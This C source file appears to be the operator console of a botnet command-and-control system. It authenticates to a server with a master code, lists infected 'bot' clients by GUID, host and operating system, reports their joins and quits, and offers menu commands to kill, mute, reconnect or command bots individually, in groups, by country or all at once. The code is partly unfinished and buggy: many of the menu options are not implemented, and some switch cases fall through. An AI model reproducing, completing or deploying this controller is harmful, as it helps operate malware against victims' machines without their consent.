#include <Windows.h>
#include <stdio.h>

#include "socket.h"
#include "config.h"
#include "log.h"
#include "utils.h"

#define MAX_CONNECT_ATTEMPTS 10

BOOL Mute = FALSE;

typedef struct _SERVER_DATA_S
{
	int Socket;
	DATA_CONTEXT DataCtx;
	int Connected;
} SERVER_DATA, *PSERVER_DATA;

void Parse(PSERVER_DATA Server)
{
	CHAR *Buffer[4096];
	PCHAR Message;
	int Arguments = 0;

	if (Mute)
		return;

	memset(Buffer, 0, sizeof(Buffer));

	//printf("%s\n", Server->DataCtx.Data.Message);

	Message = strtok(Server->DataCtx.Data.Message, "\n");
	do
	{
		Buffer[Arguments++] = Message;
	} while (Message = strtok(NULL, "\n"));

	if (!strcmp(Buffer[0], "SERVER_INFO"))
	{
		printf("\n");
		ConsoleOutput(SERVER_MESSAGE, "Server: Clients: %s | Masters: %s", Buffer[1], Buffer[2]);
		return;
	}
	else if (!strcmp(Buffer[0], "BOT_LIST_BASIC"))
	{
		puts("\n=====================================================================\nGUID\t\t\tHost\t\t\tOperating System");
		puts("=====================================================================");
		for (int i = 1; i < Arguments; ++i)
		{
			printf("%s\n", Buffer[i]);
		}
		return;
	}
	else if (!strcmp(Buffer[0], "BOT_JOIN"))
	{
		printf("\n");
		ConsoleOutput(PEER_JOIN, "Join: %s (%s) [%s]", Buffer[1], Buffer[2], Buffer[3]);
		return;
	}
	else if (!strcmp(Buffer[0], "BOT_QUIT"))
	{
		printf("\n");
		ConsoleOutput(PEER_QUIT, "Quit: %s (%s) [%s]", Buffer[1], Buffer[2], Buffer[3]);
		return;
	}

	SocketResetData(&Server->DataCtx);
}

static INT SocketConnect(SOCKET Socket, PCHAR Host, PCHAR Port)
{
	struct sockaddr_in Address;

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Socket == SOCKET_ERROR)
		return -1;

	Address.sin_addr.s_addr = inet_addr(Host);
	Address.sin_port = htons(atoi(Port));
	Address.sin_family = AF_INET;

	if (connect(Socket, (struct sockaddr *)&Address, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		return -1;

	return Socket;
}

int GetConfirmation()
{
	int		k, ret = 0;

	printf("Are you sure? (press y and then enter, else any other key)\n");
	k = getchar();
	if (k == 'y')
		ret = 1;

	while (k != '\r' && k != '\n')
		k = getchar();

	return ret;
}

void print_help()
{
	puts("+=============================================================================+");
	puts("|  m  Mute on/off          |  r  Reconnect            |  q  Quit              |");
	puts("|-----------------------------------------------------------------------------|");
	puts("|  l  List clients (basic) |  L  List clients (adv)   |                       |");
	puts("|-----------------------------------------------------|  cc Country command   |");
	puts("|  ur Reconnect user       |  nr Reconnect <n> users  |  ar Reconnect all     |");
	puts("|  uk Kill user            |  nk Kill <n> users       |  ak Kill all          |");
	puts("|  um Mute user            |  nc Command <n> users    |  am Mute all          |");
	puts("|  uc Command user         |  uq Query user           |  ac Command all       |");
	puts("|-----------------------------------------------------------------------------|");
	puts("|  jl List onjoin commands |  ja Add onjoin command   |  jr Remove onjoin cmd |");
	puts("|-----------------------------------------------------------------------------|");
	puts("|  sr Server restart       |  sq Server quit          |  si Query server info |");
	puts("+=============================================================================+");

	return;
}

INT InputLoop(PSERVER_DATA Server)
{
	CHAR  Input[256];

	print_help();
	puts("Press Ctrl+C to exit");

	for (;;)
	{
		Sleep(20);
		fputs("> ", stdout);
		fflush(stdout);
		if (fgets(Input, sizeof(Input), stdin) == NULL)
		{
			if (freopen("CONIN$", "r", stdin) == NULL)
			{
				puts("Error: can't switch back to console from file redirection!");
				Input[0] = 'q';
				Input[1] = '\0';
			}
			else
			{
				puts("Switched back to console from file redirection");
				continue;
			}
		}
		switch (Input[0])
		{
		case 'q':
			return 0;
		case 'r':
			return 1;
		case 'm':
			if (Mute)
			{
				printf("Mute swithed off\n");
				Mute = FALSE;
			}
			else
			{
				printf("Mute switched on\n");
				Mute = TRUE;
			}
		case 'l':
			SocketSend(Server->Socket, "BOT_LIST_BASIC", 15);
			break;
		case 'L':
			SocketSend(Server->Socket, "BOT_LIST_ADV", 0);
		case 's':
			switch (Input[1])
			{
			case 'r':
				if (GetConfirmation())
				{
					SocketSend(Server->Socket, "SERVER_RESTART", 15);
					return 1;
				}
				break;
			case 'i':
				SocketSend(Server->Socket, "SERVER_INFO", 11);
				break;
			}
			break;
		}
	}
}

VOID ReadThread(PSERVER_DATA Server)
{
	INT Read;

	while (Server->Connected)
	{
		Read = SocketRead(Server->Socket, &Server->DataCtx);
		if (Read == CONNECTION_ALIVE)
		{
			Parse(Server);
			SocketResetData(&Server->DataCtx);
		}
		else if (Read == CONNECTION_DEAD)
		{
			Server->Connected = 0;
			break;
		}
	}
}

int __cdecl main(int argc, char *argv[])
{
	SERVER_DATA Server;
	ULONG Mode = 0;

	if (argc < 3)
	{
		printf("Usage: %s [ip] [port]\n", argv[0]);
	}

	if (SocketInitialize() < 0)
		return -1;

	memset(&Server, 0, sizeof(SERVER_DATA));

	for (;;)
	{
		//memset(Server, 0, sizeof(SERVER_DATA));

		printf("Connecting to: %s:%s\n", argv[1], argv[2]);

		struct sockaddr_in Address;

		Server.Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (Server.Socket == SOCKET_ERROR)
			return -1;

		Address.sin_addr.s_addr = inet_addr(argv[1]);
		Address.sin_port = htons(atoi(argv[2]));
		Address.sin_family = AF_INET;

		if (connect(Server.Socket, (struct sockaddr *)&Address, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
			return -1;

		//ioctlsocket(Server.Socket, FIONBIO, (ULONG *)&Mode);
		Server.Connected = 1;

		SocketSend(Server.Socket, MASTER_CODE, (USHORT)strlen(MASTER_CODE) + 1);
		printf("Connected to %s:%s\n", argv[1], argv[2]);

		if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadThread, &Server, 0, 0))
		{

		}

		while (Server.Connected)
		{
			if (!InputLoop(&Server))
				break;
		}

		printf("Server: Connection terminated... Reconnecting\n");
		closesocket(Server.Socket);
		SocketResetData(&Server.DataCtx);
		Sleep(5000);
	}

	return 0;
}